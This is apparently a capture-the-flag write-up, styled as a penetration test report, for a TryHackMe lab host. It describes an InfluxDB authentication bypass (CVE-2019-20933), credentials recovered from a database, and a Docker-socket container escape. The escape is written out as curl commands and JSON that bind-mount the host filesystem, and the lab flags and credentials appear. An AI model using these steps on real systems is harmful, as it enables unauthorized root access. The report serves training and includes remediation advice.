SweetTooth Inc — Penetration Test Report

TryHackMe Medium · 2026-07-07

Target: 10.64.152.177 Date: 2026-07-07 Objective: Capture user.txt, container root.txt, and host root.txt

The SweetTooth engagement targeted a host exposing InfluxDB 1.3.0. An authentication bypass (CVE-2019-20933) combined with a username leaked by the /debug/requests endpoint granted unauthenticated database queries. SSH credentials recovered from the creds database provided a foothold and the user flag. The Docker socket, world-writable and exposed via socat, allowed a container escape that mounted the host filesystem and recovered both root flags.

1. Reconnaissance

Key Finding

InfluxDB 1.3.0 is vulnerable to authentication bypass (CVE-2019-20933), allowing unauthenticated query access when a valid username is known.

2. Initial Access — InfluxDB CVE-2019-20933

2.1 Username Discovery

The /debug/requests endpoint leaked an active username:

{"o5yY6yya:127.0.0.1": {"writes":2,"queries":2}}

InfluxDB User: o5yY6yya

2.2 Authentication Bypass

InfluxDB < 1.7.6 accepts JWT tokens with an empty SharedSecret, allowing authentication as any known user. Used the public CVE-2019-20933 exploit to generate a valid token.

2.3 Database Enumeration

Enumerated all databases and extracted the SSH credentials from the creds database:

Database: creds → Table: ssh
user: uzJk6Ry98d8C
pw: 7788764472

Additional database queries:

  • tanks → water_tank temperature at timestamp 1621346400: 22.5
  • mixer → mixer_stats max motor_rpm: 4875

3.1 User Flag

$ cat ~/user.txt
THM{V4w4FhBmtp4RFDti}

4. Privilege Escalation — Docker Escape

4.1 Docker Socket Exposure

The Docker socket was world-writable and exposed via socat on localhost:8080:

srw-rw-rw- 1 root influxdb 0 Jul  7 20:08 /var/run/docker.sock

The initializeandquery.sh script ran:

socat TCP-LISTEN:8080,reuseaddr,fork UNIX-CLIENT:/var/run/docker.sock &

4.2 Container Escape

Created a new container with the host filesystem mounted at /mnt:

{
  "Image": "sweettoothinc",
  "cmd": ["/bin/bash"],
  "Binds": ["/:/mnt:rw"]
}

Created and started the container via the Docker API:

curl -X POST -H "Content-Type: application/json" -d @evil.json \
  http://localhost:8080/containers/create
curl -X POST http://localhost:8080/containers/<CID>/start

4.3 Root Flags

Used the Docker exec API to read both root flags:

Container root.txt:

THM{5qsDivHdCi2oabwp}

Host root.txt:

THM{nY2ZahyFABAmjrnx}

7. Remediation Recommendations

  • Upgrade InfluxDB: Version 1.3.0 is vulnerable to CVE-2019-20933. Update to 1.7.6+.
  • Restrict debug endpoints: /debug/requests leaks authenticated usernames.
  • Restrict Docker socket: Do not expose /var/run/docker.sock inside containers, even via socat.
  • Remove world-writable Docker socket: The socket should be owned by root:docker with 660 permissions.
  • Use different passwords: InfluxDB credentials and SSH credentials should not be hardcoded in scripts.
